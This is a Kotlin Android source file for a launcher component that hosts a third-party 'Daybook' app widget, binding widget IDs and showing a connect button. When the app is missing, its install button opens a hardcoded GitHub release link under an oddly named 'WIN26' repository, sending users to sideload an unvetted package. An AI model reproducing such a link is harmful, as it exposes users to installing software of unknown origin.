package rocks.gorjan.gokixp

import android.appwidget.AppWidgetHost
import android.appwidget.AppWidgetManager
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.FrameLayout

class DaybookWidgetHost(private val activity: MainActivity, page: Int) : FrameLayout(activity) {
    private val manager = AppWidgetManager.getInstance(activity)
    private val host = AppWidgetHost(activity, 27600 + page)
    private val provider = ComponentName("com.marcel.daybook", "com.marcel.daybook.Widget")
    private val prefs = activity.getSharedPreferences("daybook-host", 0)
    private val key = "page-" + page
    private var displayed = -1
    private var listening = false

    override fun onAttachedToWindow() {
        super.onAttachedToWindow()
        host.startListening()
        listening = true
        refresh()
    }
    override fun onDetachedFromWindow() {
        listening = false
        host.stopListening()
        displayed = -1
        super.onDetachedFromWindow()
    }
    override fun onWindowFocusChanged(hasWindowFocus: Boolean) {
        super.onWindowFocusChanged(hasWindowFocus)
        if (hasWindowFocus && listening) refresh()
    }
    private fun refresh() {
        val id = prefs.getInt(key, -1)
        val info = if (id > 0) manager.getAppWidgetInfo(id) else null
        if (info?.provider == provider) {
            if (displayed == id) return
            removeAllViews()
            val content = host.createView(activity, id, info)
            addView(content, LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT))
            content.updateAppWidgetSize(Bundle(), 250, 240, 330, 280)
            displayed = id
        } else {
            displayed = -1
            removeAllViews()
            addView(Button(activity).apply {
                text = if (manager.installedProviders.any { it.provider == provider }) "Connect Daybook widget" else "Install Daybook"
                setOnClickListener { connect() }
            }, LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT))
        }
    }
    private fun connect() {
        if (manager.installedProviders.none { it.provider == provider }) {
            activity.startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(
                "https://github.com/dugasmarcel-wq/WIN26/releases/tag/win26-update-100141")))
            return
        }
        val old = prefs.getInt(key, -1)
        if (old > 0) host.deleteAppWidgetId(old)
        val id = host.allocateAppWidgetId()
        prefs.edit().putInt(key, id).apply()
        if (manager.bindAppWidgetIdIfAllowed(id, provider)) refresh() else {
            activity.startActivity(Intent(AppWidgetManager.ACTION_APPWIDGET_BIND)
                .putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, id)
                .putExtra(AppWidgetManager.EXTRA_APPWIDGET_PROVIDER, provider))
        }
    }
}
